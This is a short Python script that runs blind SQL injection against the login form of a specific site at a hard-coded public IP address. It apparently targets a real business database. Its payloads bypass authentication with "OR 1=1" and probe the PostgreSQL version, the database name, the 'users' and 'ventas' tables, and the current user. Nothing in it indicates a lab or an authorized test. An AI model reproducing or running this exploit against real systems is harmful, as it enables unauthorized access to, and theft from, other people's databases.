#!/usr/bin/env python3
import requests
import re
import sys

URL = "http://37.60.230.11/login"
session = requests.Session()

def get_csrf():
    r = session.get(URL)
    return re.search(r'_token" value="([^"]+)"', r.text).group(1)

def query(payload):
    token = get_csrf()
    r = session.post(URL, data={
        "login": payload,
        "password": "test",
        "_token": token
    }, allow_redirects=False)
    return r.status_code == 302, r.status_code, r.text[:200] if r.status_code == 200 else ""

# Quick tests
tests = [
    ("OR 1=1 (login exitoso)", "admin' OR 1=1-- -"),
    ("AND 1=2 (login fallido)", "admin' AND 1=2-- -"),
    ("Version contiene PostgreSQL", "admin' OR (SELECT version()) LIKE '%PostgreSQL%'-- -"),
    ("DB actual = plazamoyobanba", "admin' OR current_database()='plazamoyobanba'-- -"),
    ("Tabla users existe", "admin' OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users' AND table_catalog=current_database())>0-- -"),
    ("Tabla ventas existe", "admin' OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='ventas' AND table_catalog=current_database())>0-- -"),
    ("Current user", "admin' OR (SELECT LENGTH(current_user))=9-- -"),
]

for desc, payload in tests:
    r, code, body = query(payload)
    print(f"[{'OK' if r else 'NO'}] {desc}")
